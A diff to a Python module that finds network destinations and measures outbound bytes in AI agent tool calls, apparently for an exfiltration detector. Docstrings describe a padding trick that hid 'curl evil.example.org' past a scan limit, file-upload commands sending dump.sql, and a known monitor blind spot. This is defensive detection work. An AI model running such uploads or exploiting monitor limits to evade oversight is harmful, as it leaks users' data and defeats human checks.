@@ -63,8 +63,10 @@ exfiltration attempt would take.
 """
 from __future__ import annotations
 
+import json
 import re
 import shlex
+from dataclasses import dataclass, field
 
 #: Fields whose value is a destination even without a scheme.
 NETWORK_KEYS = frozenset({
@@ -73,10 +75,22 @@ NETWORK_KEYS = frozenset({
     "api_base", "api_url", "api_host", "proxy", "proxy_url", "webhook", "webhook_url", "address",
 })
 
-MAX_SCAN_DEPTH = 8            # nesting levels walked into one argument object
-MAX_SCAN_STRINGS = 2000       # strings examined per call
-MAX_STRING_CHARS = 64 * 1024  # characters examined of any one string
-MAX_DOMAINS = 200             # hosts kept per call
+MAX_SCAN_DEPTH = 32                  # nesting levels walked into one argument object
+MAX_SCAN_STRINGS = 2000              # strings examined per call
+MAX_STRING_CHARS = 10 * 1024 * 1024  # characters examined of any one string (the parsers' line limit)
+MAX_DOMAINS = 200                    # hosts kept per call
+MAX_HOST_CHARS = 512                 # characters of a bare-host value: a hostname is at most 253
+MAX_SHLEX_CHARS = 64 * 1024          # characters of a command line parsed with full shell quoting
+
+#: Why a scan stopped short of the whole argument object. Each one is counted
+#: on the call and on the graph, and reported as a ``destination_scan_truncated``
+#: anomaly: a bound that silently drops a destination is an evasion, so the
+#: bound stays and the fact that it was reached is published.
+TRUNCATED_DOMAINS = "domains"        # MAX_DOMAINS hosts already found
+TRUNCATED_STRINGS = "strings"        # MAX_SCAN_STRINGS strings already examined
+TRUNCATED_STRING = "string"          # one string longer than MAX_STRING_CHARS
+TRUNCATED_DEPTH = "depth"            # nested deeper than MAX_SCAN_DEPTH
+TRUNCATION_REASONS = (TRUNCATED_DOMAINS, TRUNCATED_STRINGS, TRUNCATED_STRING, TRUNCATED_DEPTH)
 
 _URL = re.compile(r"(?:https?|wss?|ftps?)://(?P<host>[^\s/?#\\\"'<>()\[\]{},;]+)", re.IGNORECASE)
 _IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
@@ -85,6 +99,38 @@ _HOST = re.compile(r"""
     (?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+   # one or more labels, each ending in alphanumeric
     [a-z]{2,63}$                        # a letters-only public suffix
 """, re.IGNORECASE | re.VERBOSE)
+
+
+@dataclass(slots=True)
+class _Scan:
+    """One call's scan: what it found, what it has cost, what a limit cut short.
+
+    Threaded through the whole walk, so a bound reached deep inside a nested
+    argument is visible to the caller instead of vanishing. ``strings`` is the
+    budget :data:`MAX_SCAN_STRINGS` bounds, counting one per string examined and
+    one per command-line argument read.
+    """
+    found: set[str] = field(default_factory=set)
+    strings: int = 0
+    data_bytes: int = 0                  # literal payload sizes named on a command line
+    shlex_chars: int = 0                 # command-line characters parsed with full quoting
+    truncated: set[str] = field(default_factory=set)
+
+    def note(self, reason: str) -> None:
+        self.truncated.add(reason)
+
+    @property
+    def spent(self) -> bool:
+        """True when no further value can be read: the caller should stop and say why."""
+        return len(self.found) >= MAX_DOMAINS or self.strings >= MAX_SCAN_STRINGS
+
+    def add(self, host: str) -> bool:
+        """Keep one host; False (and a note) when the per-call cap is already full."""
+        if len(self.found) >= MAX_DOMAINS:
+            self.note(TRUNCATED_DOMAINS)
+            return False
+        self.found.add(host)
+        return True
 
 
 def normalise_host(raw: str | None) -> str | None:
@@ -106,12 +152,31 @@ def normalise_host(raw: str | None) -> str | None:
     return host or None
 
 
-def domains_in_text(text: str) -> set[str]:
-    """Hosts of every full URL in ``text`` (no bare hostnames)."""
+def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
+    """Hosts of every full URL in ``text`` (no bare hostnames).
+
+    The whole string is read, up to :data:`MAX_STRING_CHARS` — the same 10 MB
+    the parsers already bound a record to. The URL pattern is a scheme followed
+    by one character class, so it scans in linear time and a megabyte of
+    padding costs a megabyte of scanning rather than hiding what follows it.
+    Before this, a cut at 64 KB meant ``echo <70 000 characters>; curl
+    evil.example.org`` reached nobody.
+    """
     if not isinstance(text, str):
         return set()
+    if len(text) > MAX_STRING_CHARS:
+        text = text[:MAX_STRING_CHARS]
+        if scan is not None:
+            scan.note(TRUNCATED_STRING)
+    if "://" not in text:
+        # Every scheme the pattern reads is followed by "://", so a string
+        # without it cannot hold a URL. The substring search is a fraction of
+        # the cost of the regex, and most strings in a session are prose, a
+        # path or a number: this is the difference between scanning a session's
+        # arguments twice and scanning them once.
+        return set()
     found = set()
-    for m in _URL.finditer(text[:MAX_STRING_CHARS]):
+    for m in _URL.finditer(text):
         host = normalise_host(m.group("host"))
         if host:
             found.add(host)
@@ -208,6 +273,9 @@ _HTTP_CLIENTS = frozenset({"curl", "wget", "http", "https", "httpie"})
 
 #: The ssh family, which shares its option set.
 _SSH_CLIENTS = frozenset({"ssh", "scp", "sftp"})
+
+#: httpie, which takes its request body as ``key=value`` positional arguments.
+_HTTPIE = frozenset({"http", "https", "httpie"})
 
 #: Programs whose address arguments are colon-separated specifications
 #: (``socat TCP4:collector.example.net:9000 -``), so every field is tried.
@@ -449,8 +517,8 @@ def _wrapped_command(args: list[str]) -> str | None:
     return None
 
 
-def _hosts_in_segment(tokens: list[str], found: set[str], budget: list[int], depth: int) -> None:
-    """Add the destinations of one command segment to ``found``."""
+def _hosts_in_segment(tokens: list[str], scan: _Scan, depth: int) -> None:
+    """Add the destinations of one command segment to ``scan``, with its payload sizes."""
     tokens = _strip_prefixes(tokens)
     if not tokens:
         return
@@ -460,7 +528,7 @@ def _hosts_in_segment(tokens: list[str], found: set[str], budget: list[int], dep
         # wrapper names no destination of its own.
         inner = _wrapped_command(tokens[1:])
         if inner and depth < MAX_SHELL_DEPTH:
-            _scan_command(inner, found, budget, depth + 1)
+            _scan_command(inner, scan, depth + 1)
         return
     if program not in NETWORK_COMMANDS:
         return                                           # not a network client: its arguments say nothing
@@ -471,32 +539,38 @@ def _hosts_in_segment(tokens: list[str], found: set[str], budget: list[int], dep
             return
     i = 0
     while i < len(args):
-        if len(found) >= MAX_DOMAINS or budget[0] >= MAX_SCAN_STRINGS:
+        if scan.spent:
+            scan.note(TRUNCATED_DOMAINS if len(scan.found) >= MAX_DOMAINS else TRUNCATED_STRINGS)
             return
         token = args[i]
         i += 1
-        budget[0] += 1
+        scan.strings += 1
         hosts: set[str] = set()
         if _OPTION.match(token):
             option, sep, inline = token.partition("=")
             kind = _option_kind(option, program)
-            if kind is None:
+            is_data = option in DATA_OPTIONS
+            if kind is None and not is_data:
                 continue                                 # a flag: nothing of it is a destination
             value = inline if sep else (args[i] if i < len(args) else "")
             if not sep and i < len(args):
                 i += 1                                   # the option consumed it, destination or not
+            if is_data:
+                scan.data_bytes += _literal_data_bytes(option, value)
             if kind == "dest":
                 hosts = _destinations_in_arg(value, program, colon_fields=True)
         else:
+            if program in _HTTPIE and "=" in token:
+                # httpie takes its body as key=value pairs: "name=x" is data.
+                scan.data_bytes += _literal_data_bytes("", token)
             hosts = _destinations_in_arg(token, program, colon_fields=program in _COLON_SPECS)
             if program in _ONE_DESTINATION:
                 remote, i = " ".join(args[i:]), len(args)  # the rest is a command for that host to run
                 if remote and depth < MAX_SHELL_DEPTH:
-                    _scan_command(remote, found, budget, depth + 1)
+                    _scan_command(remote, scan, depth + 1)
         for host in sorted(hosts):
-            if len(found) >= MAX_DOMAINS:
+            if not scan.add(host):
                 return
-            found.add(host)
 
 
 def domains_in_command(command: str, budget: list[int] | None = None) -> set[str]:
@@ -527,23 +601,39 @@ def domains_in_command(command: str, budget: list[int] | None = None) -> set[str
     """
     if not isinstance(command, str) or not command.strip():
         return set()
-    found: set[str] = set()
-    _scan_command(command, found, budget if budget is not None else [0], 0)
-    return found
+    scan = _Scan(strings=budget[0] if budget else 0)
+    _scan_command(command, scan, 0)
+    if budget is not None:
+        budget[0] = scan.strings
+    return scan.found
 
 
-def _scan_command(command: str, found: set[str], budget: list[int], depth: int) -> None:
-    """Read one command line into ``found``, segment by segment."""
-    for segment in _SEGMENTS.split(command[:MAX_STRING_CHARS]):
-        if len(found) >= MAX_DOMAINS or budget[0] >= MAX_SCAN_STRINGS:
+def _scan_command(command: str, scan: _Scan, depth: int) -> None:
+    """Read one command line into ``scan``, segment by segment.
+
+    The whole line is split: the split is one linear pass, so padding cannot
+    push a later segment out of view. Only *quoting* is bounded. Past
+    :data:`MAX_SHLEX_CHARS` of command line, segments are split on whitespace
+    instead of lexed by :mod:`shlex`, which is some hundred times faster and
+    loses no destination (a quoted argument keeps its quotes, and
+    :func:`_destinations_in_arg` strips them); it only mis-splits an argument
+    that contains a space, which is not a host.
+    """
+    for segment in _SEGMENTS.split(command):
+        if scan.spent:
+            scan.note(TRUNCATED_DOMAINS if len(scan.found) >= MAX_DOMAINS else TRUNCATED_STRINGS)
             return
         if not segment.strip():
             continue
-        try:
-            tokens = shlex.split(segment, posix=True)
-        except ValueError:
-            tokens = segment.split()                     # unbalanced quotes: never give up on the line
-        _hosts_in_segment(tokens, found, budget, depth)
+        if len(segment) <= MAX_SHLEX_CHARS and scan.shlex_chars <= MAX_SHLEX_CHARS:
+            scan.shlex_chars += len(segment)
+            try:
+                tokens = shlex.split(segment, posix=True)
+            except ValueError:
+                tokens = segment.split()                 # unbalanced quotes: never give up on the line
+        else:
+            tokens = segment.split()
+        _hosts_in_segment(tokens, scan, depth)
 
 
 def extract_domains(payload, network_key: bool = False, shell_key: bool = False) -> set[str]:
@@ -556,43 +646,51 @@ def extract_domains(payload, network_key: bool = False, shell_key: bool = False)
     a field that carries a command line (:data:`SHELL_KEYS`), so
     ``extract_domains("curl collector.example.net", shell_key=True)`` finds it.
     """
-    found: set[str] = set()
-    _walk(payload, network_key, shell_key, found, [0], 0)
-    return found
+    scan = _Scan()
+    _walk(payload, network_key, shell_key, scan, 0)
+    return scan.found
 
 
-def _walk(value, network_key: bool, shell_key: bool, found: set[str], budget: list[int], depth: int) -> None:
-    if len(found) >= MAX_DOMAINS or budget[0] >= MAX_SCAN_STRINGS or depth > MAX_SCAN_DEPTH:
+def _walk(value, network_key: bool, shell_key: bool, scan: _Scan, depth: int) -> None:
+    """Read one value into ``scan``, noting any limit that stops the walk early."""
+    if len(scan.found) >= MAX_DOMAINS:
+        scan.note(TRUNCATED_DOMAINS)
+        return
+    if scan.strings >= MAX_SCAN_STRINGS:
+        scan.note(TRUNCATED_STRINGS)
+        return
+    if depth > MAX_SCAN_DEPTH:
+        scan.note(TRUNCATED_DEPTH)
         return
     if isinstance(value, str):
-        budget[0] += 1
-        hosts = domains_in_text(value)
+        scan.strings += 1
+        hosts = domains_in_text(value, scan)
         if shell_key:
-            hosts |= domains_in_command(value[:MAX_STRING_CHARS], budget)
+            _scan_command(value[:MAX_STRING_CHARS], scan, 0)
         if network_key:
-            # Truncated like the URL search above: normalise_host strips and
-            # splits the whole value before _HOST rejects it on length, which
-            # on a multi-megabyte value under a network-named key means several
-            # full copies for nothing.
-            bare = host_in_value(value[:MAX_STRING_CHARS])
+            # A hostname is at most 253 characters, so a longer value is not
+            # one and nothing is lost by not copying it: normalise_host strips
+            # and splits the whole string before _HOST rejects it on length,
+            # which on a multi-megabyte value means several full copies for
+            # nothing. This bound cannot hide a host, so it is not a truncation.
+            bare = host_in_value(value[:MAX_HOST_CHARS])
             if bare:
                 hosts.add(bare)
         for host in sorted(hosts):
-            if len(found) >= MAX_DOMAINS:        # one string can hold hundreds of URLs
+            if not scan.add(host):           # one string can hold hundreds of URLs
                 return
-            found.add(host)
         return
     if isinstance(value, dict):
         for key, inner in value.items():
             # A nested object under a network-named key is not itself a host,
             # but its own keys may be ("endpoint": {"host": ...}).
             name = key.strip().lower() if isinstance(key, str) else ""
-            _walk(inner, name in NETWORK_KEYS, name in SHELL_KEYS, found, budget, depth + 1)
+            _walk(inner, name in NETWORK_KEYS, name in SHELL_KEYS, scan, depth + 1)
         return
     if isinstance(value, (list, tuple)):
         for inner in value:
             # ["urls": [...]] and ["command": [...]] keep the key's meaning
-            _walk(inner, network_key, shell_key, found, budget, depth + 1)
+            _walk(inner, network_key, shell_key, scan, depth + 1)
 
 
 def extract_call_domains(arguments, result=None) -> set[str]:
@@ -604,10 +702,155 @@ def extract_call_domains(arguments, result=None) -> set[str]:
     result — and not places it went. That keeps `Read` of a document full of
     URLs from reading as egress.
     """
-    found = extract_domains(arguments)
-    if found and result is not None:
-        found |= extract_domains(result)
-    return found if len(found) <= MAX_DOMAINS else set(sorted(found)[:MAX_DOMAINS])
+    return set(measure_call(arguments, result).domains)
+
+
+# ------------------------------------------------------------ how much went out
+#: Options whose value is the **body** of a request: ``curl -d``/``--data``
+#: /``--data-raw``/``--data-binary``/``--data-urlencode``, ``-F``/``--form``,
+#: ``-T``, ``wget --post-data``/``--body-data``. Only the *size* of the value is
+#: read, never the value, and it is reported as
+#: :attr:`CallEgress.data_bytes` — how much of the call was a declared payload.
+#: It is **not** added to the outbound size: those bytes are already in the
+#: argument text, and counting them twice would say a call sent more than it
+#: holds.
+DATA_OPTIONS = frozenset({
+    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "--json",
+    "-F", "--form", "--form-string", "-T", "--upload-file", "--post-data", "--body-data", "--post-file",
+})
+
+#: Of those, the ones whose value is always a *file path*. A file's size is not
+#: in the log, so it counts as zero — and that is a measured blind spot
+#: (``file_upload_exfil`` in the injection benchmark), not an estimate.
+_FILE_OPTIONS = frozenset({"-T", "--upload-file", "--post-file", "--infile"})
+
+
+def argument_bytes(arguments) -> int:
+    """UTF-8 size of a call's arguments, as compact JSON with sorted keys.
+
+    One number, computed the same way for every parser, so the same call
+    measures the same whatever log it came from — which is what makes a
+    per-destination baseline comparable at all. Sorted keys and no whitespace
+    for the same reason: the size must not move because a log writer changed
+    its formatting.
+
+    Never raises. An argument object that will not serialise (a set, a live
+    object, a cycle) falls back to ``str()``, which is still a size.
+    """
+    if arguments is None:
+        return 0
+    try:
+        text = json.dumps(arguments, sort_keys=True, separators=(",", ":"),
+                          ensure_ascii=False, default=str)
+    except (TypeError, ValueError, RecursionError):
+        text = repr(type(arguments))                     # unserialisable: its size is not the log's
+    # The fast path is the common one and exact: an ASCII string's UTF-8 size
+    # is its length, and skipping the encode skips a copy of every argument
+    # object in the session.
+    return len(text) if text.isascii() else len(text.encode("utf-8", "replace"))
+
+
+def _literal_data_bytes(option: str, value: str) -> int:
+    """Size of an option's value when it *is* the payload, 0 when it names a file.
+
+    ``curl -d '{"a":1}'`` sends nine bytes this can see. ``curl -d @dump.sql``
+    and ``curl -T /var/backups/dump.sql`` send a file whose size the log does
+    not contain, so they count zero: an unknown is not a small number, and
+    pretending otherwise would hide an upload behind a plausible figure.
+    """
+    if option in _FILE_OPTIONS:
+        return 0
+    text = value.strip().strip("\"'")
+    if text.startswith("@") or "=@" in text:             # -d @file, -F field=@file
+        return 0
+    return len(text.encode("utf-8", "replace"))
+
+
+@dataclass(frozen=True, slots=True)
+class CallEgress:
+    """What one tool call sent, and where — sizes and host names, never content.
+
+    ``outbound_bytes`` **is** ``argument_bytes``: one number, counted once. A
+    literal request body is part of the argument text that carried it, so
+    adding ``data_bytes`` on top would count the same bytes twice and make a
+    call that spells its payload out weigh double one that passes it another
+    way. ``data_bytes`` is kept as a separate, informative figure — how much of
+    the call was a declared payload — and is not added to anything.
+
+    ``outbound_bytes`` is attributed in full to **every** destination of the
+    call: a request names one host but a call may name several, and nothing in
+    a log says how the bytes divided between them. Over-attributing is the
+    conservative direction for a detector, and the number is a signal about one
+    destination's traffic rather than an accounting of the wire.
+    """
+    domains: frozenset[str] = frozenset()
+    #: The call's outbound size: exactly ``argument_bytes``, never a sum.
+    outbound_bytes: int = 0
+    argument_bytes: int = 0
+    #: How much of the command line was a literal payload (``curl -d``, …).
+    #: Informative only: a subset of ``argument_bytes``, not an addition to it.
+    data_bytes: int = 0
+    #: Reasons a limit cut the scan short, if any; see :data:`TRUNCATION_REASONS`.
+    truncated: tuple[str, ...] = ()
+
+    @property
+    def network(self) -> bool:
+        """True when this call named a destination, so a truncated scan had a network side effect."""
+        return bool(self.domains)
+
+
+def measure_call(arguments, result=None) -> CallEgress:
+    """Destinations of one tool call, and the bytes it sent to each of them.
+
+    The destinations are :func:`extract_call_domains`' — the arguments, plus
+    the result when the arguments already pointed somewhere. A call that named
+    no destination is not measured at all: its size would be attributed to
+    nothing.
+
+    The size is the arguments' own (:func:`argument_bytes`), counted **once**.
+    The literal payloads named on a shell command line
+    (:data:`DATA_OPTIONS`) are measured separately as ``data_bytes``, which
+    says how much of the call was a declared body, and are *not* added to it:
+    those bytes are already part of the argument text that carried them, and
+    counting them twice would weigh a ``curl -d`` call double for no reason an
+    operator could explain.
+
+    A result is never outbound and its size is never counted.
+    """
+    scan = _Scan()
+    _walk(arguments, False, False, scan, 0)
+    # The scan is local and goes out of scope here, so its sets are taken
+    # rather than copied: this runs once per tool call of every session.
+    domains, truncated = scan.found, scan.truncated
+    if domains and result is not None:
+        tail = _Scan()
+        _walk(result, False, False, tail, 0)
+        domains |= tail.found
+        truncated |= tail.truncated
+    if len(domains) > MAX_DOMAINS:
+        domains = set(sorted(domains)[:MAX_DOMAINS])
+        truncated.add(TRUNCATED_DOMAINS)
+    # Only a call that went somewhere has an outbound size worth computing, and
+    # serialising every argument object of a session to measure calls that
+    # reached nobody would be the whole cost of this feature for nothing.
+    size = argument_bytes(arguments) if domains else 0
+    return CallEgress(domains=frozenset(domains), outbound_bytes=size,
+                      argument_bytes=size, data_bytes=scan.data_bytes,
+                      truncated=tuple(sorted(truncated)))
+
+
+#: 1024-based, with one decimal past a kilobyte: the unit a log reader expects
+#: next to a byte count, and the same one the anomaly messages print.
+_UNITS = ((1024 ** 3, "GB"), (1024 ** 2, "MB"), (1024, "KB"))
+
+
+def format_bytes(count: float) -> str:
+    """``1536`` as ``"1.5 KB"``; bytes below a kilobyte stay bytes."""
+    count = float(count)
+    for size, unit in _UNITS:
+        if abs(count) >= size:
+            return f"{count / size:.1f} {unit}"
+    return f"{count:.0f} B"
 
 
 # --------------------------------------------------------------------- patterns
